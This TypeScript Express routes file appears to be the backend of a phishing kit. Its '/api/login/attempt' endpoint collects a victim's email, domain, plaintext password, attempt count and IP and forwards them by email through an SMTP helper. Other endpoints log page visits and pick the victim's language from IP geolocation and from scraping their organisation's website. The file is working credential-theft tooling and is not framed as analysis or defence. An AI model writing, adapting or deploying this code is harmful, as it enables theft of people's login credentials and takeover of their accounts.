import type { Express } from "express";
import { createServer, type Server } from "http";
import { sendLoginAttemptNotification, sendVisitNotification } from "./smtp";

// IP-based language detection function
async function detectLanguageFromIP(ip: string): Promise<string> {
  try {
    // Use a free IP geolocation service that includes country info
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode`);
    const data = await response.json();
    
    if (data.status === 'success') {
      const countryCode = data.countryCode?.toLowerCase();
      
      // Map country codes to languages
      const countryLanguageMap: { [key: string]: string } = {
        'ro': 'ro', // Romania -> Romanian
        'es': 'es', // Spain -> Spanish
        'mx': 'es', // Mexico -> Spanish
        'ar': 'es', // Argentina -> Spanish
        'co': 'es', // Colombia -> Spanish
        'pe': 'es', // Peru -> Spanish
        'cl': 'es', // Chile -> Spanish
        'fr': 'fr', // France -> French
        'ca': 'fr', // Canada -> French (though it could be English too)
        'be': 'fr', // Belgium -> French
        'ch': 'fr', // Switzerland -> French
        'de': 'de', // Germany -> German
        'at': 'de', // Austria -> German
        'it': 'it', // Italy -> Italian
        'pt': 'pt', // Portugal -> Portuguese
        'br': 'pt', // Brazil -> Portuguese
        'cn': 'zh', // China -> Chinese
        'tw': 'zh', // Taiwan -> Chinese
        'hk': 'zh', // Hong Kong -> Chinese
        'jp': 'ja', // Japan -> Japanese
        'kr': 'ko', // South Korea -> Korean
        'ru': 'ru', // Russia -> Russian
        'ua': 'uk', // Ukraine -> Ukrainian
        'pl': 'pl', // Poland -> Polish
        'cz': 'cs', // Czech Republic -> Czech
        'sk': 'sk', // Slovakia -> Slovak
        'hu': 'hu', // Hungary -> Hungarian
        'bg': 'bg', // Bulgaria -> Bulgarian
        'hr': 'hr', // Croatia -> Croatian
        'rs': 'sr', // Serbia -> Serbian
        'si': 'sl', // Slovenia -> Slovenian
        'ee': 'et', // Estonia -> Estonian
        'lv': 'lv', // Latvia -> Latvian
        'lt': 'lt', // Lithuania -> Lithuanian
        'fi': 'fi', // Finland -> Finnish
        'se': 'sv', // Sweden -> Swedish
        'no': 'no', // Norway -> Norwegian
        'dk': 'da', // Denmark -> Danish
        'nl': 'nl', // Netherlands -> Dutch
        'tr': 'tr', // Turkey -> Turkish
        'gr': 'el', // Greece -> Greek
        'il': 'he', // Israel -> Hebrew
        'sa': 'ar', // Saudi Arabia -> Arabic
        'ae': 'ar', // UAE -> Arabic
        'eg': 'ar', // Egypt -> Arabic
        'ma': 'ar', // Morocco -> Arabic
        'dz': 'ar', // Algeria -> Arabic
        'tn': 'ar', // Tunisia -> Arabic
        'in': 'hi', // India -> Hindi
        'th': 'th', // Thailand -> Thai
        'vn': 'vi', // Vietnam -> Vietnamese
        'id': 'id', // Indonesia -> Indonesian
        'my': 'ms', // Malaysia -> Malay
        'ph': 'tl', // Philippines -> Filipino
      };
      
      const detectedLanguage = countryLanguageMap[countryCode];
      if (detectedLanguage) {
        console.log(`Detected language ${detectedLanguage} from IP country: ${data.country} (${countryCode})`);
        return detectedLanguage;
      }
    }
  } catch (error) {
    console.error('IP-based language detection error:', error);
  }
  
  return 'en'; // Default to English
}

// Language detection function
async function detectWebsiteLanguage(domain: string): Promise<string> {
  try {
    // Try to fetch the website's HTML content
    const response = await fetch(`https://${domain}`, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      timeout: 5000
    });

    if (!response.ok) {
      return 'en';
    }

    const html = await response.text();

    // Check for language attributes in HTML
    const langAttrMatch = html.match(/<html[^>]*lang=["']([^"']+)["'][^>]*>/i);
    if (langAttrMatch) {
      const lang = langAttrMatch[1].toLowerCase();
      // Return the primary language code (before any dash)
      return lang.split('-')[0];
    }

    // Check for meta language tags
    const metaLangMatch = html.match(/<meta[^>]*http-equiv=["']content-language["'][^>]*content=["']([^"']+)["'][^>]*>/i);
    if (metaLangMatch) {
      const lang = metaLangMatch[1].toLowerCase();
      return lang.split('-')[0];
    }

    // Check common language indicators in text content
    const textContent = html.replace(/<[^>]*>/g, ' ').toLowerCase();

    // Simple language detection based on common words
    const languageIndicators = {
      'es': ['español', 'nosotros', 'servicios', 'productos', 'empresa', 'contacto', 'inicio'],
      'fr': ['français', 'nous', 'services', 'produits', 'entreprise', 'contact', 'accueil'],
      'de': ['deutsch', 'über', 'dienstleistungen', 'produkte', 'unternehmen', 'kontakt', 'startseite'],
      'it': ['italiano', 'noi', 'servizi', 'prodotti', 'azienda', 'contatto', 'home'],
      'pt': ['português', 'sobre', 'serviços', 'produtos', 'empresa', 'contato', 'início'],
      'zh': ['中文', '我们', '服务', '产品', '公司', '联系', '首页'],
      'ja': ['日本語', '私たち', 'サービス', '製品', '会社', '連絡先', 'ホーム']
    };

    for (const [lang, indicators] of Object.entries(languageIndicators)) {
      const matches = indicators.filter(indicator => textContent.includes(indicator));
      if (matches.length >= 2) {
        return lang;
      }
    }

    return 'en'; // Default to English
  } catch (error) {
    console.error('Language detection error:', error);
    return 'en';
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Visit tracking notification
  app.post("/api/login/visit", async (req, res) => {
    try {
      const { email, domain } = req.body;
      const ip = req.ip || req.connection.remoteAddress || 'Unknown';

      await sendVisitNotification(email, domain, ip);
      res.json({ success: true });
    } catch (error) {
      console.error("Error handling visit tracking:", error);
      res.status(500).json({ error: "Failed to process visit tracking" });
    }
  });

  // Login attempt notification
  app.post("/api/login/attempt", async (req, res) => {
    try {
      const { email, domain, password, attempt } = req.body;
      const ip = req.ip || req.connection.remoteAddress || 'Unknown';

      await sendLoginAttemptNotification(email, domain, password, attempt, ip);
      res.json({ success: true });
    } catch (error) {
      console.error("Error handling login attempt:", error);
      res.status(500).json({ error: "Failed to process login attempt" });
    }
  });

  // Language detection endpoint
  app.post("/api/detect-language", async (req, res) => {
    try {
      const { domain } = req.body;
      const ip = req.ip || req.connection.remoteAddress || 'Unknown';

      if (!domain) {
        return res.status(400).json({ error: "Domain is required" });
      }

      // First try to detect language from IP geolocation
      const ipLanguage = await detectLanguageFromIP(ip);
      
      // If IP detection fails or returns English, fallback to domain detection
      let language = ipLanguage;
      if (ipLanguage === 'en') {
        language = await detectWebsiteLanguage(domain);
      }

      res.json({ language, detectedFrom: ipLanguage !== 'en' ? 'ip' : 'domain' });
    } catch (error) {
      console.error("Error detecting language:", error);
      res.status(500).json({ language: "en" }); // Default to English on error
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}